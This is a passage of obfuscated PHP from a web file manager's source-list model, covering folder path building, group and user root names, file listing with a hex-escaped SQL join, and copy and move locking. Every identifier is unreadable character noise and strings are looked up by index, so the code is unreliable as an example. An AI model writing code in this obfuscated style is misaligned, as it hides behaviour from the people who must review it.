(!$ı¸¨Ê) { $÷ı¿Ğßø->remove($Ó•Å¹¸‰[$¾×©õüü[492]]); unset($ğ¡ıÖÛâ[$°ëœÎÇù]); continue; } $ã¬ìú´Ê = $äªêÏÅ¤->listData($ı¸¨Ê[$¾×©õüü[507]]); if (!$ã¬ìú´Ê) { $÷ı¿Ğßø->remove($Ó•Å¹¸‰[$¾×©õüü[492]]); unset($ğ¡ıÖÛâ[$°ëœÎÇù]); continue; } $Ó•Å¹¸‰[$¾×©õüü[507]] = $ã¬ìú´Ê; $Ó•Å¹¸‰[$¾×©õüü[600]] = $ı¸¨Ê; $Ó•Å¹¸‰[$¾×©õüü[601]] = Model($¾×©õüü[602])->getInfoSimpleOuter($Ó•Å¹¸‰[$¾×©õüü[546]]); $ğ¡ıÖÛâ[$°ëœÎÇù] = $Ó•Å¹¸‰; } } $¼óõ§‰ = USER_ID; $äì«Ò°ò = array(); $¢»¹Á²ˆ = $this->_listAppendPath($äì«Ò°ò, !0); foreach ($µ·«Ä’¡ as $°ëœÎÇù => &$Ó•Å¹¸‰) { if (!is_array($Ó•Å¹¸‰[$¾×©õüü[507]])) { continue; } if ($Ó•Å¹¸‰[$¾×©õüü[199]] != $¾×©õüü[603]) { continue; } if (isset($ğ¡ıÖÛâ[$Ó•Å¹¸‰[$¾×©õüü[202]]])) { $¬¹’ÇÓÀ = $ğ¡ıÖÛâ[$Ó•Å¹¸‰[$¾×©õüü[202]]]; if (!is_array($Ó•Å¹¸‰[$¾×©õüü[560]])) { $Ó•Å¹¸‰[$¾×©õüü[560]] = array(); } $Ó•Å¹¸‰[$¾×©õüü[560]][$¾×©õüü[604]] = $¬¹’ÇÓÀ[$¾×©õüü[599]]; $Ó•Å¹¸‰[$¾×©õüü[507]][$¾×©õüü[605]] = $¬¹’ÇÓÀ; $Ó•Å¹¸‰[$¾×©õüü[507]][$¾×©õüü[606]] = $Ó•Å¹¸‰[$¾×©õüü[607]]; $Ó•Å¹¸‰[$¾×©õüü[507]][$¾×©õüü[608]] = $¾×©õüü[101]; if ($¬¹’ÇÓÀ[$¾×©õüü[546]] != $¼óõ§‰) { $Ó•Å¹¸‰[$¾×©õüü[507]][$¾×©õüü[508]] = $Ó•Å¹¸‰[$¾×©õüü[507]][$¾×©õüü[508]] & $¬¹’ÇÓÀ[$¾×©õüü[507]][$¾×©õüü[507]]; } continue; } $¿ÑŸÍï  = $this->parentLevelArray($Ó•Å¹¸‰[$¾×©õüü[609]]); $«ÀÎ ¼¬ = array_reverse($¿ÑŸÍï ); foreach ($«ÀÎ ¼¬ as $®ÉÌ“Ÿ => $‘Ê“Ş±¿) { if (!isset($ğ¡ıÖÛâ[$‘Ê“Ş±¿])) { continue; } $¬¹’ÇÓÀ = $ğ¡ıÖÛâ[$‘Ê“Ş±¿]; $Ó•Å¹¸‰[$¾×©õüü[507]][$¾×©õüü[605]] = $¬¹’ÇÓÀ; if ($¬¹’ÇÓÀ[$¾×©õüü[546]] != $¼óõ§‰) { $Ó•Å¹¸‰[$¾×©õüü[507]][$¾×©õüü[508]] = $Ó•Å¹¸‰[$¾×©õüü[507]][$¾×©õüü[508]] & $¬¹’ÇÓÀ[$¾×©õüü[507]][$¾×©õüü[507]]; } $…§ı´ü = $¾×©õüü[12]; $™Úå¯²÷ = count($¿ÑŸÍï ) - $®ÉÌ“Ÿ; for ($ã©ƒÄ€ú = 0; $ã©ƒÄ€ú < $™Úå¯²÷; $ã©ƒÄ€ú++) { if (!isset($¢»¹Á²ˆ[$¿ÑŸÍï [$ã©ƒÄ€ú]])) { $…§ı´ü = $¾×©õüü[12]; break; } $…§ı´ü = $…§ı´ü . rtrim($¢»¹Á²ˆ[$¿ÑŸÍï [$ã©ƒÄ€ú]], $¾×©õüü[8]) . $¾×©õüü[8]; } $Ó•Å¹¸‰[$¾×©õüü[507]][$¾×©õüü[606]] = rtrim($…§ı´ü, $¾×©õüü[8]) . $¾×©õüü[8]; break; } } unset($Ó•Å¹¸‰); } public function groupPathDisplay(&$Ê‡¿©è¼) { $øİâà¦‚ =& $_SERVER[ŒÅŸ‹ä†]; if ($Ê‡¿©è¼[$øİâà¦‚[199]] != self::TYPE_GROUP) { return; } $´Â£œò§ = Model($øİâà¦‚[610])->getInfo($Ê‡¿©è¼[$øİâà¦‚[594]]); $ŠÈÓÎªü = $this->parentLevelArray($´Â£œò§[$øİâà¦‚[609]]); $ë‡Ùºø = $øİâà¦‚[12]; foreach ($ŠÈÓÎªü as $Ê†Éµ²À) { $ñÍ¢•á¬ = Model($øİâà¦‚[610])->getInfo($Ê†Éµ²À); $ë‡Ùºø .= $ñÍ¢•á¬[$øİâà¦‚[100]][$øİâà¦‚[202]] . $øİâà¦‚[60]; } $Ê‡¿©è¼[$øİâà¦‚[611]] = $´Â£œò§[$øİâà¦‚[201]]; $Ê‡¿©è¼[$øİâà¦‚[612]] = $´Â£œò§[$øİâà¦‚[609]]; $Ê‡¿©è¼[$øİâà¦‚[613]] = $´Â£œò§[$øİâà¦‚[614]]; $Ê‡¿©è¼[$øİâà¦‚[615]] = $ë‡Ùºø . $´Â£œò§[$øİâà¦‚[100]][$øİâà¦‚[202]]; } protected function _listAppendPath(&$íªÔ¥Ì, $¥½ÊöÆĞ = false) { $¾Šœ×Øœ =& $_SERVER[ŒÅŸ‹ä†]; static $ƒÉ½šèï = array(); $ø¶´§–¿ = array(); $ÍÀ€Íä = array(); if ($¥½ÊöÆĞ) { return $ƒÉ½šèï; } foreach ($íªÔ¥Ì as &$àéÕ³è¥) { $î€àŠ½ï = $àéÕ³è¥[$¾Šœ×Øœ[202]]; if ($àéÕ³è¥[$¾Šœ×Øœ[505]] == $¾Šœ×Øœ[101] && $àéÕ³è¥[$¾Šœ×Øœ[201]] != 0) { $ƒÉ½šèï[$î€àŠ½ï] = $àéÕ³è¥[$¾Šœ×Øœ[42]]; } if ($àéÕ³è¥[$¾Šœ×Øœ[505]] == $¾Šœ×Øœ[101] && $àéÕ³è¥[$¾Šœ×Øœ[201]] == 0) { $ƒÉ½šèï[$î€àŠ½ï] = $this->_listAppendPathRoot($àéÕ³è¥, array()); } if (isset($ÍÀ€Íä[$àéÕ³è¥[$¾Šœ×Øœ[609]]])) { continue; } $ÍÀ€Íä[$àéÕ³è¥[$¾Šœ×Øœ[609]]] = !0; $­„½ò¾€ = $this->parentLevelArray($àéÕ³è¥[$¾Šœ×Øœ[609]]); foreach ($­„½ò¾€ as $©ë¤ëô§ => $ü³Ï‡çã) { if (isset($ƒÉ½šèï[$ü³Ï‡çã])) { continue; } if ($©ë¤ëô§ == 0) { $ƒÉ½šèï[$ü³Ï‡çã] = $this->_listAppendPathRoot($àéÕ³è¥, $­„½ò¾€); } if ($©ë¤ëô§ != 0) { $ø¶´§–¿[] = $ü³Ï‡çã; } } } unset($àéÕ³è¥); $ø¶´§–¿ = array_unique($ø¶´§–¿); if (count($ø¶´§–¿) > 0) { $µ’ÃÙ¥¾ = array($¾Šœ×Øœ[511] => array($¾Šœ×Øœ[512], $ø¶´§–¿)); if (count($ø¶´§–¿) == 1) { $¨ê¤³ÔŸ = $this->sourceInfo($ø¶´§–¿[0]); $ø±óè = is_array($¨ê¤³ÔŸ) ? array($¨ê¤³ÔŸ) : !1; } else { $ø±óè = $this->field($¾Šœ×Øœ[616])->where($µ’ÃÙ¥¾)->select(); } if (!$ø±óè) { $ø±óè = array(); } foreach ($ø±óè as $ùƒÃ¾¸±) { $ƒÉ½šèï[$ùƒÃ¾¸±[$¾Šœ×Øœ[202]]] = $ùƒÃ¾¸±[$¾Šœ×Øœ[42]]; } } $÷ÖÅ«íÈ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¨Øüäşª = array(); foreach ($íªÔ¥Ì as &$àéÕ³è¥) { $½ùÆšÕ = $àéÕ³è¥[$¾Šœ×Øœ[609]]; $åû«èçö = $¾Šœ×Øœ[12]; if (isset($¨Øüäşª[$½ùÆšÕ])) { $åû«èçö = $¨Øüäşª[$½ùÆšÕ]; } else { $­„½ò¾€ = $this->parentLevelArray($àéÕ³è¥[$¾Šœ×Øœ[609]]); foreach ($­„½ò¾€ as $©ë¤ëô§ => $ü³Ï‡çã) { if (isset($ƒÉ½šèï[$ü³Ï‡çã])) { $åû«èçö .= $ƒÉ½šèï[$ü³Ï‡çã] . $¾Šœ×Øœ[8]; } } $¨Øüäşª[$½ùÆšÕ] = $åû«èçö; } $åû«èçö .= $àéÕ³è¥[$¾Šœ×Øœ[42]]; if ($àéÕ³è¥[$¾Šœ×Øœ[505]] == $¾Šœ×Øœ[101]) { $åû«èçö .= $¾Šœ×Øœ[8]; } $àéÕ³è¥[$¾Šœ×Øœ[607]] = str_replace($¾Šœ×Øœ[265], $¾Šœ×Øœ[8], $åû«èçö); if ($àéÕ³è¥[$¾Šœ×Øœ[201]] == $¾Šœ×Øœ[239]) { $àéÕ³è¥[$¾Šœ×Øœ[42]] = trim($ƒÉ½šèï[$àéÕ³è¥[$¾Šœ×Øœ[202]]], $¾Šœ×Øœ[8]); $àéÕ³è¥[$¾Šœ×Øœ[607]] = $àéÕ³è¥[$¾Šœ×Øœ[42]] . $¾Šœ×Øœ[8]; } if (intval($àéÕ³è¥[$¾Šœ×Øœ[199]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($àéÕ³è¥, $­„½ò¾€, $÷ÖÅ«íÈ); } } unset($àéÕ³è¥); return $íªÔ¥Ì; } private function _listAppendPathRecycle(&$ï „ã¢Ô, $§ç’é, $œÈëö›´) { $³ºªŠš‡ =& $_SERVER[ŒÅŸ‹ä†]; if (!in_array($œÈëö›´, $§ç’é) && $ï „ã¢Ô[$³ºªŠš‡[202]] != $œÈëö›´) { return; } $¬„ü’Ê· = explode($³ºªŠš‡[8], trim($ï „ã¢Ô[$³ºªŠš‡[607]], $³ºªŠš‡[8])); $Ø”âßÒÕ = implode($³ºªŠš‡[8], array_slice($¬„ü’Ê·, 2)); $ï „ã¢Ô[$³ºªŠš‡[607]] = $³ºªŠš‡[8] . LNG($³ºªŠš‡[617]) . $³ºªŠš‡[8] . ltrim($Ø”âßÒÕ, $³ºªŠš‡[8]); $ï „ã¢Ô[$³ºªŠš‡[609]] = $³ºªŠš‡[618] . implode($³ºªŠš‡[60], array_slice($§ç’é, 1)) . $³ºªŠš‡[60]; if ($ï „ã¢Ô[$³ºªŠš‡[202]] == $œÈëö›´) { $ï „ã¢Ô[$³ºªŠš‡[609]] = $³ºªŠš‡[618]; $ï „ã¢Ô[$³ºªŠš‡[201]] = $³ºªŠš‡[239]; $ï „ã¢Ô[$³ºªŠš‡[42]] = LNG($³ºªŠš‡[617]); } $ï „ã¢Ô[$³ºªŠš‡[619]] = $³ºªŠš‡[620]; } protected function _listAppendPathRoot(&$‘ãË³¢, $®—ê×Õ) { $ê‰·…ì£ =& $_SERVER[ŒÅŸ‹ä†]; static $ÛÒÇŒÄ = false; static $¡äú€å‚ = false; $†í¯Úğî = $ê‰·…ì£[12]; if ($‘ãË³¢[$ê‰·…ì£[199]] == self::TYPE_USER) { if ($‘ãË³¢[$ê‰·…ì£[594]] == USER_ID) { $†í¯Úğî = LNG($ê‰·…ì£[621]); if ($ÛÒÇŒÄ === !1) { $İ°ÌğÇº = Model($ê‰·…ì£[622])->getInfoFull(USER_ID); $ÛÒÇŒÄ = _get($İ°ÌğÇº, $ê‰·…ì£[623], $ê‰·…ì£[12]); } if ($¡äú€å‚ === !1) { $İ°ÌğÇº = Model($ê‰·…ì£[622])->getInfoFull(USER_ID); $¡äú€å‚ = _get($İ°ÌğÇº, $ê‰·…ì£[624], $ê‰·…ì£[12]); } if ($®—ê×Õ && $®—ê×Õ[0] == $ÛÒÇŒÄ || !$®—ê×Õ && $‘ãË³¢[$ê‰·…ì£[202]] == $ÛÒÇŒÄ) { $†í¯Úğî = LNG($ê‰·…ì£[625]); $‘ãË³¢[$ê‰·…ì£[626]] = $ê‰·…ì£[627]; } if ($®—ê×Õ && $®—ê×Õ[0] == $¡äú€å‚ || !$®—ê×Õ && $‘ãË³¢[$ê‰·…ì£[202]] == $¡äú€å‚) { $†í¯Úğî = $†í¯Úğî . $ê‰·…ì£[628] . LNG($ê‰·…ì£[629]); } if (!$®—ê×Õ) { $‘ãË³¢[$ê‰·…ì£[42]] = $†í¯Úğî; } } else { $İ°ÌğÇº = Model($ê‰·…ì£[622])->getInfoFull($‘ãË³¢[$ê‰·…ì£[594]]); $ù€¶ ¿Î = _get($İ°ÌğÇº, $ê‰·…ì£[624], $ê‰·…ì£[12]); $‘ãË³¢[$ê‰·…ì£[630]] = Model($ê‰·…ì£[602])->getInfoSimpleOuter($‘ãË³¢[$ê‰·…ì£[594]]); $†í¯Úğî = LNG($ê‰·…ì£[631]) . $ê‰·…ì£[184] . $‘ãË³¢[$ê‰·…ì£[630]][$ê‰·…ì£[42]] . $ê‰·…ì£[186]; if ($®—ê×Õ && $®—ê×Õ[0] == $ù€¶ ¿Î || !$®—ê×Õ && $‘ãË³¢[$ê‰·…ì£[202]] == $ù€¶ ¿Î) { $†í¯Úğî = LNG($ê‰·…ì£[631]) . $ê‰·…ì£[632] . $‘ãË³¢[$ê‰·…ì£[630]][$ê‰·…ì£[42]] . $ê‰·…ì£[628] . LNG($ê‰·…ì£[629]) . $ê‰·…ì£[186]; } } } else { if ($‘ãË³¢[$ê‰·…ì£[199]] == self::TYPE_GROUP) { $ÖÜé’—Ñ = Model($ê‰·…ì£[610])->getInfoSimple($‘ãË³¢[$ê‰·…ì£[594]]); $†í¯Úğî = $ÖÜé’—Ñ[$ê‰·…ì£[42]]; } else { if ($‘ãË³¢[$ê‰·…ì£[199]] == self::TYPE_SYSTEM) { $†í¯Úğî = $ê‰·…ì£[633]; } } } $†í¯Úğî = $†í¯Úğî ? $ê‰·…ì£[8] . $†í¯Úğî . $ê‰·…ì£[8] : $ê‰·…ì£[8]; return $†í¯Úğî; } protected function _listAppendUser(&$…ÅÏ‡ŸŞ) { $çï–·á =& $_SERVER[ŒÅŸ‹ä†]; $ñ›‘€äş = array_to_keyvalue($…ÅÏ‡ŸŞ, $çï–·á[12], $çï–·á[546]); $€İ”‰˜´ = array_to_keyvalue($…ÅÏ‡ŸŞ, $çï–·á[12], $çï–·á[548]); $š¥×‘Ú´ = array_merge($ñ›‘€äş, $€İ”‰˜´); $°Ûş¦ı× = Model($çï–·á[622])->userListInfo($š¥×‘Ú´); foreach ($…ÅÏ‡ŸŞ as &$Õğ®Ğ¯Ì) { $Œø´¿€§ = $Õğ®Ğ¯Ì[$çï–·á[546]]; $Õğ®Ğ¯Ì[$çï–·á[546]] = $°Ûş¦ı×[$Œø´¿€§] ? $°Ûş¦ı×[$Œø´¿€§] : !1; $Œø´¿€§ = $Õğ®Ğ¯Ì[$çï–·á[548]]; $Õğ®Ğ¯Ì[$çï–·á[548]] = $°Ûş¦ı×[$Œø´¿€§] ? $°Ûş¦ı×[$Œø´¿€§] : !1; if (_get($Õğ®Ğ¯Ì, $çï–·á[634], 0)) { $¯ï½Éğ = $GLOBALS[$çï–·á[6]][$çï–·á[102]][$çï–·á[635]]; if ($Õğ®Ğ¯Ì[$çï–·á[560]][$çï–·á[636]] <= time() - $¯ï½Éğ) { $this->metaSet($Õğ®Ğ¯Ì[$çï–·á[202]], $çï–·á[637], null); $this->metaSet($Õğ®Ğ¯Ì[$çï–·á[202]], $çï–·á[636], null); unset($Õğ®Ğ¯Ì[$çï–·á[560]][$çï–·á[637]]); continue; } $÷ê‹°Ô = $Õğ®Ğ¯Ì[$çï–·á[560]][$çï–·á[637]]; $Õğ®Ğ¯Ì[$çï–·á[560]][$çï–·á[638]] = Model($çï–·á[622])->getInfoSimpleOuter($÷ê‹°Ô); } } unset($Õğ®Ğ¯Ì); } public function parentLevelArray($öâ†›ùã) { $ÙŞÈÏ÷“ =& $_SERVER[ŒÅŸ‹ä†]; $öâ†›ùã = explode($ÙŞÈÏ÷“[60], trim($öâ†›ùã, $ÙŞÈÏ÷“[60])); return array_to_int(array_filter($öâ†›ùã)); } public function listAll($ŸªëÇˆî) { $ÒÀ—˜şÌ =& $_SERVER[ŒÅŸ‹ä†]; $ñ¦ÒÕÓÎ = $this->sourceInfo($ŸªëÇˆî); $ªƒ»©õÎ = array($ÒÀ—˜şÌ[639] => array($ÒÀ—˜şÌ[640], $ñ¦ÒÕÓÎ[$ÒÀ—˜şÌ[609]] . $ŸªëÇˆî . $ÒÀ—˜şÌ[641]), $ÒÀ—˜şÌ[642] => 0); $¯å×—¾ç = $ÒÀ—˜şÌ[643]; $»Ğ¸¤µó = "\114\105\x46\x54\40\x4a\x4f\x49\116\40{$this->tablePrefix}\x69\x6f\x5f\x66\x69\154\145\x20\146\x69\x6c\x65\40\157\156\40\163\x6f\x75\x72\x63\145\56\x66\x69\154\x65\111\104\40\75\40\x66\151\154\145\x2e\x66\151\x6c\145\x49\104"; $…ğïÒğ = $this->alias($ÒÀ—˜şÌ[538])->field($¯å×—¾ç)->where($ªƒ»©õÎ)->join($»Ğ¸¤µó)->select(); $this->_listAppendAuth($…ğïÒğ); $this->_listAppendUser($…ğïÒğ); $this->_listAppendPath($…ğïÒğ); $…ğïÒğ = array_to_keyvalue($…ğïÒğ, $ÒÀ—˜şÌ[202]); $Ò±ÙÆĞ = "\57{$ñ¦ÒÕÓÎ[$ÒÀ—˜şÌ[42]]}\57"; $Ò±ÙÆĞ = $Ò±ÙÆĞ == $ÒÀ—˜şÌ[265] ? $ÒÀ—˜şÌ[8] : $Ò±ÙÆĞ; $ÅìõÙöŞ = array(); foreach ($…ğïÒğ as $ş¤Åñàß => $™¬¸€ê¿) { $ªÖ ºõ = $this->parentLevelArray($™¬¸€ê¿[$ÒÀ—˜şÌ[609]]); array_shift($ªÖ ºõ); $â»Ã¸œ§ = $Ò±ÙÆĞ; for ($©Îµ‹ = 0; $©Îµ‹ < count($ªÖ ºõ); $©Îµ‹++) { $â»Ã¸œ§ .= $…ğïÒğ[$ªÖ ºõ[$©Îµ‹]][$ÒÀ—˜şÌ[42]] . $ÒÀ—˜şÌ[8]; } $â»Ã¸œ§ .= $™¬¸€ê¿[$ÒÀ—˜şÌ[42]]; if ($™¬¸€ê¿[$ÒÀ—˜şÌ[505]]) { $â»Ã¸œ§ .= $ÒÀ—˜şÌ[8]; } $ñÅØ˜¿ = array($ÒÀ—˜şÌ[515] => str_replace($ÒÀ—˜şÌ[265], $ÒÀ—˜şÌ[8], str_replace($ÒÀ—˜şÌ[265], $ÒÀ—˜şÌ[8], str_replace($ÒÀ—˜şÌ[265], $ÒÀ—˜şÌ[8], $â»Ã¸œ§))), $ÒÀ—˜şÌ[644] => intval($™¬¸€ê¿[$ÒÀ—˜şÌ[505]]), $ÒÀ—˜şÌ[645] => intval($™¬¸€ê¿[$ÒÀ—˜şÌ[89]]), $ÒÀ—˜şÌ[98] => intval($™¬¸€ê¿[$ÒÀ—˜şÌ[98]]), $ÒÀ—˜şÌ[100] => $this->pathInfoFilter($™¬¸€ê¿)); if (!$ñÅØ˜¿[$ÒÀ—˜şÌ[505]]) { $ñÅØ˜¿[$ÒÀ—˜şÌ[562]] = $™¬¸€ê¿[$ÒÀ—˜şÌ[562]]; } $ÅìõÙöŞ[] = $ñÅØ˜¿; } $ÅìõÙöŞ = array_sort_by($ÅìõÙöŞ, $ÒÀ—˜şÌ[97]); return $ÅìõÙöŞ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Ÿ®Ô³»Õ) { $ôê—«À =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->allowLock()) { return; } $this->_lockCheck($ôê—«À[646], $Ÿ®Ô³»Õ); $£‰¶éõñ = 1; $this->_lockEvent($Ÿ®Ô³»Õ, array($ôê—«À[647], $ôê—«À[648]), $£‰¶éõñ); $this->_lockParent($Ÿ®Ô³»Õ, array($ôê—«À[648]), $£‰¶éõñ); $this->_lockEvent($Ÿ®Ô³»Õ, array($ôê—«À[649], $ôê—«À[650]), $£‰¶éõñ); $this->_lockCheckEnd($ôê—«À[646], $Ÿ®Ô³»Õ); } public function lockCopyEnd($ó¿ÏÃ´ì) { $–èİÌÍ =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->allowLock()) { return; } $ÔßµÏ´È = 0; $this->_lockEvent($ó¿ÏÃ´ì, array($–èİÌÍ[647], $–èİÌÍ[648]), $ÔßµÏ´È); $this->_lockParent($ó¿ÏÃ´ì, array($–èİÌÍ[648]), $ÔßµÏ´È); $this->_lockEvent($ó¿ÏÃ´ì, array($–èİÌÍ[649], $–èİÌÍ[650]), $ÔßµÏ´È); } public function lockWriteStart($¨„ôÜÊ®, $ıü¼‚êŒ = '') { $ó¨Ø…²â =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->allowLock()) { return; } $this->_lockCheck($ó¨Ø…²â[647], $¨„ôÜÊ®); $ÛµÔ…¯ = 1; $this->_lockKey($ó¨Ø…²â[651] . $¨„ôÜÊ® . $ó¨Ø…²â[10] . $ıü¼‚êŒ, $ÛµÔ…¯); $this->_lockEvent($¨„ôÜÊ®, array($ó¨Ø…²â[646], $ó¨Ø…²â[648]), $ÛµÔ…¯); $this->_lockParent($¨„ôÜÊ®, array($ó¨Ø…²â[646], $ó¨Ø…²â[648]), $ÛµÔ…¯); $this->_lockCheckEnd($ó¨Ø…²â[647], $¨„ôÜÊ®); } public function lockWriteEnd($ø„é÷¦¾, $Ñğìõ¿Ú = '') { $©ãõ®˜ =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->allowLock()) { return; } $àÊ¬ƒ¨¡ = 0; $this->_lockKey($©ãõ®˜[651] . $ø„é÷¦¾ . $©ãõ®˜[10] . $Ñğìõ¿Ú, $àÊ¬ƒ¨¡); $this->_lockEvent($ø„é÷¦¾, array($©ãõ®˜[646], $©ãõ®˜[648]), $àÊ¬ƒ¨¡); $this->_lockParent($ø„é÷¦¾, array($©ãõ®˜[646], $©ãõ®˜[648]), $àÊ¬ƒ¨¡); } public function lockMoveStart($®ä¬—–Ç) { $ªı¹…»ä =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->allowLock()) { return; } $this->_lockCheck($ªı¹…»ä[648], $®ä¬—–Ç); $ãÆª¡‹¥ = 1; $this->_lockKey($ªı¹…»ä[652] . $®ä¬—–Ç, $ãÆª¡‹¥); $this->_lockEvent($®ä¬—–Ç, array($ªı¹…»ä[646], $ªı¹…»ä[647]), $ãÆª¡‹¥); $this->_lockParent($®ä¬—–Ç, array($ªı¹…»ä[646], $ªı¹…»ä[648]), $ãÆª¡‹¥); $this->_lockEvent($®ä¬—–Ç, array($ªı¹…»ä[653], $ªı¹…»ä[649], $ªı¹…»ä[650]), $ãÆª¡‹¥); $this->_lockCheckEnd($ªı¹…»ä[648], $®ä¬—–Ç); } public function lockMoveEnd($‘ãş¿‡) { $ßàœæÉ =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->allowLock()) { return; } $ŠûÖ¶µ“ = 0; $this->_lockKey($ßàœæÉ[652] . $‘ãş¿‡, $ŠûÖ¶µ“); $this->_lockEvent($‘ãş¿‡, array($ßàœæÉ[646], $ßàœæÉ[647]), $ŠûÖ¶µ“); $this->_lockParent($‘ãş¿‡, array($ßàœæÉ[646], $ßàœæÉ[648]), $ŠûÖ¶µ“); $this->_lockEvent($‘ãş¿‡, array($ßàœæÉ[653], $ßàœæÉ[649], $ßàœæÉ[650]), $ŠûÖ¶µ“); } private function _lockCheck($’œ„ÆˆĞ, $±–Å®–) { $–Ó¾Œßç =& $_SERVER[ŒÅŸ‹ä†]; $‘ÍßÔĞö = $this->sourceInfo($±–Å®–); $ÛŠ›¾ù– = $’œ„ÆˆĞ . $–Ó¾Œßç[10] . $±–Å®–; $this->_lockTimeStart[$ÛŠ›¾ù–] = timeFloat(); if (!is_array($‘ÍßÔĞö)) { return; } $œô„²Á = LNG($–Ó¾Œßç[654]); CacheLock::setErrorMsg($–Ó¾Œßç[184] . htmlspecialchars($‘ÍßÔĞö[$–Ó¾Œßç[42]]) . $–Ó¾Œßç[186] . $œô„²Á); $this->_lockKey($ÛŠ›¾ù–, 1); $this->_lockKey($ÛŠ›¾ù–, 0); $…§‚ÑãÛ = array_reverse($this->parentLevelArray($‘ÍßÔĞö[$–Ó¾Œßç[609]])); foreach ($…§‚ÑãÛ as $É§Øç–é) { $ÛŠ›¾ù– = $’œ„ÆˆĞ . $–Ó¾Œßç[655] . $É§Øç–é; if (CacheLock::lockGet($–Ó¾Œßç[656] . $ÛŠ›¾ù–)) { $‘ÍßÔĞö = $this->sourceInfo($É§Øç–é); CacheLock::setErrorMsg($–Ó¾Œßç[184] . htmlspecialchars($‘ÍßÔĞö[$–Ó¾Œßç[42]]) . $–Ó¾Œßç[186] . $œô„²Á); $this->_lockKey($ÛŠ›¾ù–, 1); $this->_lockKey($ÛŠ›¾ù–, 0); } } } private function _lockCheckEnd($¯Ğ³á²È, $ŞŠĞåñ) { $´Ù½‰Öƒ =& $_SERVER[ŒÅŸ‹ä†]; $§ê¡êª÷ = $¯Ğ³á²È . $´Ù½‰Öƒ[10] . $ŞŠĞåñ; CacheLock::setErrorMsg($´Ù½‰Öƒ[472]); if (!isset($this->_lockTimeStart[$§ê¡êª÷])) { return; } $ø™ä“ÑÔ = timeFloat() - $this->_lockTimeStart[$§ê¡êª÷]; unset($this->_lockTimeStart[$§ê¡êª÷]); if ($ø™ä“ÑÔ > 0.5) { unset(self::$cacheSourceInfo[$´Ù½‰Öƒ[552] . $ŞŠĞåñ]); } $ù‘ÂŠñ‚ = $this->sourceInfo($ŞŠĞåñ); if (!$ù‘ÂŠñ‚) { show_json(LNG($´Ù½‰Öƒ[116]), !1); } } private function _lockParent($Ïù¹ó˜Ì, $©°¸àÃ, $ÖÔÉà¹ô) { if (!$this->autoLockSet) { return; } $‡ô¡‡ç° = $this->sourceInfo($Ïù¹ó˜Ì); if (!is_array($‡ô¡‡ç°)) { return; } $‹Ÿ´Ã‡ = array_reverse($this->parentLevelArray($‡ô¡‡ç°[$_SERVER[ŒÅŸ‹ä†][609]])); foreach ($‹Ÿ´Ã‡ as $ÊóÔ) { $this->_lockEvent($ÊóÔ, $©°¸àÃ, $ÖÔÉà¹ô); } } private function _lockEvent($°ÍØ¦Äã, $‰“çÇó“, $©¬”¯¸×) { $¶©üœ× =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->autoLockSet) { return; } foreach ($‰“çÇó“ as $™üïÔëâ) { $ÊÓ€ÓÃ¨ = $™üïÔëâ . $¶©üœ×[10] . $°ÍØ¦Äã; if ($©¬”¯¸× && CacheLock::lockGet($¶©üœ×[656] . $ÊÓ€ÓÃ¨)) { continue; } $this->_lockKey($ÊÓ€ÓÃ¨, $©¬”¯¸×); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Ì¦‰ëÁ, $ÅÖ²¢îŒ = 1) { $¬ÂİƒĞ• = $_SERVER[ŒÅŸ‹ä†][656] . md5($Ì¦‰ëÁ); if ($ÅÖ²¢îŒ) { if (isset(self::$_lockItemArr[$¬ÂİƒĞ•])) { return; } self::$_lockItemArr[$¬ÂİƒĞ•] = 1; CacheLock::lock($¬ÂİƒĞ•, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¬ÂİƒĞ•])) { return; } unset(self::$_lockItemArr[$¬ÂİƒĞ•]); CacheLock::unlock($¬ÂİƒĞ•); } } public function isParentOf($³ááÛ•, $œÔÏ·±¯) { $öÙÅ¼î² =& $_SERVER[ŒÅŸ‹ä†]; $¾•È„ğ² = $this->sourceInfo($³ááÛ•); $Ú€æ† = $this->sourceInfo($œÔÏ·±¯); $ıîµçŒ¥ = $¾•È„ğ²[$öÙÅ¼î²[609]] . $¾•È„ğ²[$öÙÅ¼î²[202]] . $öÙÅ¼î²[60]; $½ä–µ´ã = $Ú€æ†[$öÙÅ¼î²[609]] . $Ú€æ†[$öÙÅ¼î²[202]] . $öÙÅ¼î²[60]; $ù‚¥è“¾ = strpos($½ä–µ´ã, $ıîµçŒ¥) === 0; return $ù‚¥è“¾; } private $targetIsDelete = 0; public function copy($İİÉ†·•, $¡©¤ø¹», $ Å…Ùòô = REPEAT_REPLACE, $¯Ğ‰çºˆ = '') { $¼§ß¡ØÆ =& $_SERVER[ŒÅŸ‹ä†]; $™õó“ÍÍ = $this->sourceInfo($İİÉ†·•); $¼Ÿ°ÙŒè = $this->sourceInfo($¡©¤ø¹»); if (!$™õó“ÍÍ || !$¼Ÿ°ÙŒè || $¼Ÿ°ÙŒè[$¼§ß¡ØÆ[505]] != $¼§ß¡ØÆ[101]) { return !1; } if ($this->isParentOf($İİÉ†·•, $¡©¤ø¹»)) { return !1; } $‹îĞµœ¤ = $¯Ğ‰çºˆ ? $¯Ğ‰çºˆ : $™õó“ÍÍ[$¼§ß¡ØÆ[42]]; $this->lockCopyStart($İİÉ†·•); $this->lockWriteStart($¡©¤ø¹», $‹îĞµœ¤); $“òÂ·Œ² = array($¼§ß¡ØÆ[657] => array(), $¼§ß¡ØÆ[658] => array(), $¼§ß¡ØÆ[659] => array()); $this->targetIsDelete = intval($™õó“ÍÍ[$¼§ß¡ØÆ[525]]); $äó…Œ™œ = $this->fileNameExistAuto($¡©¤ø¹», $™õó“ÍÍ); $Å”×²æÒ = $this->_copy($İİÉ†·•, $¡©¤ø¹», $ Å…Ùòô, $“òÂ·Œ², !0, $¯Ğ‰çºˆ); $this->_childrenListClear(); $this->lockCopyEnd($İİÉ†·•); $this->lockWriteEnd($¡©¤ø¹», $‹îĞµœ¤); if ($™õó“ÍÍ[$¼§ß¡ØÆ[505]] == 